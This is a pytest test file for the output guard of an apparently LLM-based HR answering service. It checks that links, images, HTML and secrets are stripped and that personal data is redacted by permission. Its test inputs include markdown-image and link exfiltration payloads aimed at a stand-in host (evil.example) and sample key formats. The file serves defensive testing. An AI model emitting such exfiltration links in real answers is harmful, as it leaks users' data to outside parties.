"""S3 (ISS-044): output checks: no links, images, HTML, or secrets; personal data by permission."""

import pytest

from app.answering.answer import Answerer
from app.domain import AccessScope, Chunk
from app.guards.output import check_output
from app.guards.pii import detect
from app.retrieval.search import ChunkIndex
from tests.fakes import KeywordEmbeddings, ScriptedChatModel

EMPLOYEE = AccessScope(tenant_id="t", roles=["employee"])
PII_READER = AccessScope(tenant_id="t", roles=["employee"], can_read_pii=True)


@pytest.mark.parametrize(
    ("answer", "expected"),
    [
        ("25 days [leave:1]. ![x](https://evil.example/?d=SECRET)", "25 days [leave:1]."),
        ("See [the portal](https://peoplehub.example.com) [leave:1].", "See the portal [leave:1]."),
        (
            "Visit https://evil.example/collect?q=25 now [leave:1].",
            "Visit [link removed] now [leave:1].",
        ),
        ("Or www.evil.example/x [leave:1].", "Or [link removed] [leave:1]."),
        ("25 days <img src='https://evil.example/p.gif'>[leave:1].", "25 days [leave:1]."),
        ("<b>25 days</b> [leave:1].", "25 days [leave:1]."),
    ],
)
def test_exfiltration_channels_are_removed(answer: str, expected: str) -> None:
    cleaned, verdict = check_output(answer, EMPLOYEE)
    assert cleaned == expected
    assert verdict.decision == "MASK"


def test_citations_in_both_bracket_styles_survive() -> None:
    answer = "25 days [annual-leave-policy:1] and £190【expense-policy:1:1】."
    assert check_output(answer, EMPLOYEE) == (answer, check_output(answer, EMPLOYEE)[1])
    assert check_output(answer, EMPLOYEE)[1].decision == "PASS"


@pytest.mark.parametrize(
    "secret",
    [
        "sk-abcdefghijklmnopqrstuvwxyz123456",
        "gsk_abcdefghijklmnopqrstuvwxyz123456",
        "AKIAIOSFODNN7EXAMPLE",
        "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcdefghijklmnop",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY-----",
    ],
)
def test_secrets_are_redacted_even_for_pii_readers(secret: str) -> None:
    cleaned, verdict = check_output(f"The key is {secret} [it:1].", PII_READER)
    assert cleaned == "The key is [SECRET] [it:1]."
    assert "SECRET" in verdict.reason


def test_personal_data_is_redacted_without_pii_read_even_with_narrow_spaces() -> None:
    # Real model output (2026-11-02): it wrote the IBAN with narrow no-break spaces.
    answer = "IBAN **GB82 WEST 1234 5698 7654 32**【payees:1】"
    cleaned, verdict = check_output(answer, EMPLOYEE)
    assert "GB82" not in cleaned and "[IBAN]" in cleaned
    assert "IBAN" in verdict.reason


def test_pii_readers_keep_personal_data() -> None:
    answer = "IBAN GB82 WEST 1234 5698 7654 32 [payees:1]."
    assert check_output(answer, PII_READER)[0] == answer


def test_the_detector_reads_narrow_spaces_and_odd_hyphens() -> None:
    assert [m.kind for m in detect("NI JM 49 28 37 A")] == ["UK_NINO"]
    assert [m.kind for m in detect("mobile 07700 900123")] == ["UK_MOBILE"]


def test_in_the_graph_an_exfiltration_link_never_reaches_the_user() -> None:
    chunk = Chunk(id="leave:1:0", doc_id="leave", source="leave.md", page=1, text="leave 25 days")
    a = Answerer(
        index=ChunkIndex([chunk], KeywordEmbeddings(["leave"])),
        chat_model=ScriptedChatModel(
            responses=["25 days [leave:1] ![x](https://evil.example/?d=1)"]
        ),
        top_k=1,
    )

    result = a.answer("leave?")

    assert (result.status, result.answer) == ("answered", "25 days [leave:1]")
    assert any(v.guard == "output" for v in result.verdicts)
